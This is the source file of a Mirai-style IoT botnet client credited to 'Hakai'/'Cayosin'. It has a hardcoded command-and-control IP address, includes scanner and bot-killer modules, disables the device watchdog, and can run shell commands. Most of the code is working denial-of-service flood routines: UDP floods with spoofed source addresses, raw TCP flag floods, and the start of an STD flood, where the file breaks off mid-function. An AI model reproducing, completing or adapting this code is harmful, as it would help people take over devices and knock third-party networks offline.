//Hakai by Shadoh
//Revamped by Tragedy //Dedsec is God
/*    
    -Cayosin Bot Attributes-
    //Randomized Hexed Payload STD/HTTP Floods
    //Cloudflare HTTP Path
    //Improved Custom Bot Killer (Strings/Bins)
    //VSE/XMAS/UDP/TCP/RHex STD/RHex HTTP
*/     
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(hacks), sizeof(hacks2), sizeof(hacks3), sizeof(hacks4))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define OPT_SGA   3
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define PHI 0x9e3779b9
#define STD2_SIZE 200
#define std_packets 512

#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/util.h"
#include "headers/table.h"
#include "headers/scanner.h"
#include "headers/huawei_scanner.h"
#include "headers/realtek_scanner.h"


#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

int hacks[] = {23};//23.254.161.87
int hacks2[] = {254};
int hacks3[] = {161};
int hacks4[] = {87}; 
int hakai_bp = 420;

const char *UserAgents[] = {
    "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
};

char *inet_ntoa(struct in_addr in);
int initConnection();
int sockprintf(int sock, char *formatStr, ...);
int KHcommSOCK = 0, KHserverHACKER = -1, userID = 1, watchdog_pid = 0;

uint32_t *pids;
uint32_t scanPid;
uint32_t ngPid;
uint64_t numpids = 0;
int killer_status = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};

static uint32_t Q[4096], c = 362436;

void makeRandomStr(unsigned char *buf, int length);
void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2); //el oh el

    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1)
    {
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);

    
    exit(0);
}
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}


void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    table_unlock_val(TABLE_MISC_RANDSTRING);
    char *alphaset = table_retrieve_val(TABLE_MISC_RANDSTRING, NULL);

    while (len > 0)
    {
        if (len >= sizeof (uint32_t))
        {
            int i;
            uint32_t entropy = rand_cmwc();;

            for (i = 0; i < sizeof (uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else
        {
            *str++ = rand_cmwc() % (sizeof (alphaset));
            len--;
        }
    }
    table_lock_val(TABLE_MISC_RANDSTRING);
}
static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, intptr_t );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int zprintf(const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}

int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        //zprintf("buf: %s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}

int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        fdopen_pids[fdes] = 0;
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
        long ret = 0;
        while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
        return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern)
        {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void uppercase(unsigned char *str)
{
        while(*str) { *str = toupper(*str); str++; }
}



void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {

                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(KHcommSOCK, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;

//      zprintf("recv: %s\n", cp);

        return count;
}


int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}


in_addr_t findRandIP(in_addr_t netmask)
{
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

void udpfl00d(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32) {
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd) {
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister) {
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd) {
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
return;
}
int counter = 50;
while(counter--) {
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( findRandIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister) {
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
}
}
void tcpFl00d(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
void rtcp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->syn = 1;
        tcph->psh = 1;
        tcph->ack = 1;
        tcph->urg = 1;
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
void sendSTD(unsigned char *ip, int port, int secs) {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
  unsigned char *hexstring = malloc(1024);
  memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char * randstrings[] = {
